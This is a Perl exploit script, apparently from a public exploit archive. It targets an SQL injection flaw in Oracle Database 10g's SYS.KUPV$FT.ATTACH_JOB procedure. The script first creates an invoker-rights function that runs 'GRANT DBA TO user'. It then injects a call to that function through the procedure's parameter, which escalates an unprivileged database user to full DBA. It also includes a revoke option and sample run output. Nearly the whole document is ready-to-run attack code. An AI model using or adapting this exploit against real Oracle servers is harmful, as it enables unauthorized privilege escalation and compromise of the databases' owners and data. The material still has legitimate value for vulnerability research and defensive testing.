#!/usr/bin/perl
#
# Remote Oracle KUPV$FT.ATTACH_JOB exploit (10g)
#
# Grant or revoke dba permission to unprivileged user
# 
# Tested on "Oracle Database 10g Enterprise Edition Release 10.1.0.3.0"
# 
#   REF:    http://www.securityfocus.com/bid/16294
#
#   AUTHOR: Andrea "bunker" Purificato
#           http://rawlab.mindcreations.com
#
#   DATE:   Copyright 2007 - Thu Feb 22 17:18:55 CET 2007
#
# Oracle InstantClient (basic + sdk) required for DBD::Oracle
#
#
# bunker@fin:~$ perl kupv-ft_attach_job.pl -h localhost -s test -u bunker -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from BUNKER...
#  DBD::Oracle::db do failed: ORA-01031: insufficient privileges (DBD ERROR: OCIStmtExecute) [for Statement "REVOKE DBA FROM BUNKER"] at kupv-ft_attach_job.pl line 61.
#  [-] Done!
#  
# bunker@fin:~$ perl kupv-ft_attach_job.pl -h localhost -s test -u bunker -p **** -g
#  [-] Wait...
#  [-] Creating evil function...
#  [-] Go ...(don't worry about error)!
#  DBD::Oracle::st execute failed: ORA-31626: job does not exist
#  ORA-06512: at "SYS.DBMS_SYS_ERROR", line 79
#  ORA-06512: at "SYS.KUPV$FT", line 330
#  ORA-31638: cannot attach to job ' AND 0=BUNKER.own-- for user
#  ORA-31632: master table ".' AND 0=BUNKER.own--" not found, invalid, or inaccessible
#  ORA-00942: table or view does not exist
#  ORA-06512: at line 6 (DBD ERROR: OCIStmtExecute) [for Statement "
#   DECLARE
#    J BOOLEAN;
#    R NUMBER;
#   BEGIN
#    R:=SYS.KUPV$FT.ATTACH_JOB('',''' AND 0=BUNKER.own--',J);
#   END;
#  "] at kupv-ft_attach_job.pl line 87.
#  [-] YOU GOT THE POWAH!!
#  
# bunker@fin:~$ perl kupv-ft_attach_job.pl -h localhost -s test -u bunker -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from BUNKER...
#  [-] Done!
#  

use warnings;
use strict;
use DBI;
use Getopt::Std;
use vars qw/ %opt /;

sub usage {
    print <<"USAGE";
    
Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> -g|-r [-P <port>]

Options:
     -h     <host>     target server address
     -s     <sid>      target sid name
     -u     <user>     user
     -p     <passwd>   password 

     -g|-r             (g)rant dba to user | (r)evoke dba from user
    [-P     <port>     Oracle port]

USAGE
    exit 0
}

my $opt_string = 'h:s:u:p:grP:';
getopts($opt_string, \%opt) or &usage;
&usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} );
&usage if ( !$opt{g} and !$opt{r} );
my $user = uc $opt{u};

my $dbh = undef;
if ($opt{P}) {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}", $opt{u}, $opt{p}) or die;
} else {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s}", $opt{u}, $opt{p}) or die;
}

my $sqlcmd = "GRANT DBA TO $user";
print "[-] Wait...\n";

if ($opt{r}) {
    print "[-] Revoking DBA from $user...\n";
    $sqlcmd = "REVOKE DBA FROM $user";
    $dbh->do( $sqlcmd );
    print "[-] Done!\n";
    $dbh->disconnect;
    exit;
}

print "[-] Creating evil function...\n";
$dbh->do( qq{
CREATE OR REPLACE FUNCTION OWN RETURN NUMBER 
 AUTHID CURRENT_USER AS 
 PRAGMA AUTONOMOUS_TRANSACTION; 
BEGIN
 EXECUTE IMMEDIATE '$sqlcmd'; COMMIT; 
 RETURN(0);
END;
} );
 
print "[-] Go ...(don't worry about errors)!\n";
my $sth = $dbh->prepare( qq{
DECLARE
 J BOOLEAN; R NUMBER;
BEGIN
 R:=SYS.KUPV\$FT.ATTACH_JOB('',''' AND 0=$user.own--',J);
END;
});
$sth->execute;
$sth->finish;
print "[-] YOU GOT THE POWAH!!\n";
$dbh->disconnect;
exit;
